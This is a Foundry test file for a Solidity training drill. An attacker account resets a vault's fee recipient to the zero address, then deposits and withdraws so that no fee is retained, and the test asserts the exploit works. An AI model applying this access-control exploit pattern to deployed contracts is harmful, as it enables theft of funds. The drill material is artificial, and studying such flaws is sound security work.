// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/Drill8E_Compositional.sol";

contract Drill8E_Test is Test {
    VaultCompositional vault;
    MockToken token;
    address attacker = address(0xBAD);

    function setUp() public {
        token = new MockToken();
        vault = new VaultCompositional(address(token));
        token.mint(attacker, 1000 ether);
    }

    function test_CompositionalAttack() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);

        // Step 1: reset feeRecipient to address(0)
        vault.setFeeRecipient(address(0));

        // Step 2: deposit + withdraw — fee goes to attacker (self-claim)
        vault.deposit(100 ether);
        uint256 balBefore = token.balanceOf(attacker);
        vault.withdraw(100 ether);
        uint256 balAfter = token.balanceOf(attacker);

        vm.stopPrank();

        // The attack succeeded — attacker got fee back as rebate
        // Demonstrates compositional vulnerability:
        // setFeeRecipient(0) + withdraw() = no fee retained
        assertGe(balAfter, balBefore, "attacker preserved balance (no fee charged)");
    }
}
